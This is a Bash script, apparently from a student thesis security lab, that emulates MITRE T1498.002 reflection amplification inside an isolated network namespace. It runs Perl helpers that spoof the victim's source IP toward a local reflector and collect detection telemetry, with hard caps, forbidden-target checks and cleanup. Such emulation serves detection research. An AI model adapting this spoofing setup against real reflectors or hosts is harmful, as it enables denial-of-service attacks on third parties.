#!/usr/bin/env bash
# ============================================================================
# ATA054 · T1498.002 Reflection Amplification — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1498.002 Network DoS: Reflection Amplification (tactica Impact).
# Fuente  : custom (propio). ART no trae prueba de T1498 (tecnica ausente) -> propio.
# Objetivo: demostrar el mecanismo de AMPLIFICACION POR REFLEXION con un
#           REFLECTOR LOCAL montado en el laboratorio y AMPLIFICACION ACOTADA:
#           el spoofer envia peticiones UDP con FUENTE FALSIFICADA (= IP de la
#           victima) a un reflector local; el reflector responde al origen
#           falsificado -> la victima recibe mas bytes de los que envio.
# Topologia: segmento LOCAL AISLADO (par veth + netns `tfgref`) DENTRO de la
#           victima. NUNCA sale a VMnet1, NUNCA toca el manager (192.168.65.128)
#           ni el PC (192.168.65.1).
# Ejecuta : como ROOT (raw socket + netns), desde /home/angel/lab-attack/ATA054.
# Elevacion: SI (sudo; solo la ventana del ataque).
#
# ⚠️ GUARDARRAILES DUROS (abortan):
#   - reflector SIEMPRE en 10.200.0.0/24 (segmento local aislado);
#   - NUNCA como destino 192.168.65.128 (manager) ni 192.168.65.1 (PC);
#   - COUNT <= 40; RESP_BYTES <= 8192; TOTAL amplificado <= 512 KiB; duracion <= 15 s;
#   - limpieza total (netns + veth + procesos) al salir (trap).
#   - NO se usan amplificadores reales de internet.
#
# Telemetria esperada (ver README §5):
#   - execve de perl (reflector/spoofer/target)  -> 80792 (deteccion; T1498.002-S1).
#   - execve de ip (setup de red)                -> 80792 (deteccion; T1498.002-S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA054/*` (S3).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el target registra N paquetes
#   amplificados de RESP_BYTES (la victima recibe la amplificacion); factor =
#   bytes_recibidos / bytes_enviados > 1.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="/home/angel/lab-attack/ATA054"
NS="tfgref"
VETH_A="vrefa0"
VETH_B="vrefb0"
REF_IP="10.200.0.2"
REF_PORT=10053
VETH_A_IP="10.200.0.1"
SPOOF_IP="192.168.65.129"
SPOOF_PORT=5399
RESP_BYTES=4096
COUNT=25
PAYLOAD_BYTES=16
CAP_RESP=40
MAX_RESP_BYTES=8192
MAX_TOTAL=524288          # 512 KiB
MAX_TIME=15

echo "ATA054 · T1498.002 Reflection Amplification (reflector local acotado) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones -----------------------------------------------------------
[ -d "$BASE" ] || { echo "ERROR: no existe $BASE" >&2; exit 1; }
for b in perl ip; do
  command -v "$b" >/dev/null 2>&1 || { echo "ERROR: falta $b" >&2; exit 1; }
done
# la fuente falsificada debe ser la IP real de la victima (self-reflection)
if ! ip -4 addr show ens33 | grep -q "$SPOOF_IP"; then
  echo "ERROR: $SPOOF_IP no esta en ens33; ABORTADO" >&2
  exit 1
fi

# --- GUARDARRAILES ------------------------------------------------------------
if [ "$COUNT" -gt "$CAP_RESP" ] || [ "$RESP_BYTES" -gt "$MAX_RESP_BYTES" ]; then
  echo "ERROR: cotas fuera de rango (abortado)" >&2; exit 1
fi
TOTAL=$((COUNT * RESP_BYTES))
if [ "$TOTAL" -gt "$MAX_TOTAL" ] || [ "$MAX_TIME" -gt 15 ]; then
  echo "ERROR: total/tiempo fuera de cota (abortado)" >&2; exit 1
fi
case "$REF_IP" in
  10.200.*) : ;;
  *) echo "ERROR: reflector '$REF_IP' fuera del segmento local 10.200.0.0/24; ABORTADO" >&2; exit 1 ;;
esac
for d in "$REF_IP" "$SPOOF_IP"; do
  if [ "$d" = "192.168.65.128" ] || [ "$d" = "192.168.65.1" ]; then
    echo "ERROR: destino prohibido (manager/PC); ABORTADO" >&2; exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

PIDS=""
cleanup() {
  for p in $PIDS; do kill "$p" 2>/dev/null || true; done
  pkill -f "ATA054_reflector.pl" 2>/dev/null || true
  pkill -f "ATA054_target.pl" 2>/dev/null || true
  ip netns del "$NS" 2>/dev/null || true
  ip link del "$VETH_A" 2>/dev/null || true
}
trap cleanup EXIT

# --- setup del segmento LOCAL AISLADO (netns + veth) --------------------------
ip netns del "$NS" 2>/dev/null || true
ip link del "$VETH_A" 2>/dev/null || true
ip netns add "$NS"
ip link add "$VETH_A" type veth peer name "$VETH_B"
ip addr add "$VETH_A_IP/24" dev "$VETH_A"
ip link set "$VETH_A" up
ip link set "$VETH_B" netns "$NS"
ip netns exec "$NS" ip addr add "$REF_IP/24" dev "$VETH_B"
ip netns exec "$NS" ip link set "$VETH_B" up
ip netns exec "$NS" ip link set lo up
ip netns exec "$NS" ip route add "$SPOOF_IP/32" dev "$VETH_B"
echo "segmento_local: $VETH_A=$VETH_A_IP/24  ${NS}:${VETH_B}=$REF_IP/24"

# --- reflector (dentro del netns) --------------------------------------------
ip netns exec "$NS" perl "$BASE/ATA054_reflector.pl" "$REF_IP" "$REF_PORT" "$RESP_BYTES" "$COUNT" 12000 \
  > "$BASE/reflector.out" 2>&1 &
PIDS="$PIDS $!"
sleep 1

# --- target (escucha en la IP falsificada) -----------------------------------
perl "$BASE/ATA054_target.pl" "$SPOOF_IP" "$SPOOF_PORT" "$COUNT" 12000 > "$BASE/target.out" 2>&1 &
PIDS="$PIDS $!"
sleep 1

# --- spoofer (peticiones con fuente falsificada) ------------------------------
echo "--- reflector=$REF_IP:$REF_PORT target=$SPOOF_IP:$SPOOF_PORT requests=$COUNT ---"
perl "$BASE/ATA054_spoofer.pl" "$SPOOF_IP" "$SPOOF_PORT" "$REF_IP" "$REF_PORT" "$COUNT" "$PAYLOAD_BYTES" \
  > "$BASE/spoofer.out" 2>&1
cat "$BASE/spoofer.out"

# esperar a que llegue la amplificacion
sleep 3

echo "--- resultados ---"
cat "$BASE/reflector.out" 2>/dev/null || true
cat "$BASE/target.out" 2>/dev/null || true

# --- limpieza explicita -------------------------------------------------------
cleanup
trap - EXIT

echo "--- estado final ---"
echo "netns_residuales=$(ip netns list | grep -c "$NS" || true)"
echo "veth_residuales=$(ip link show "$VETH_A" 2>/dev/null | wc -l)"
if [ "$(ip link show "$VETH_A" 2>/dev/null | wc -l)" -eq 0 ]; then
  echo "REFLECTION_AMPLIFICATION=OK (segmento retirado; 0 residuos de red)"
else
  echo "REFLECTION_AMPLIFICATION=FALLO (quedo el veth)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
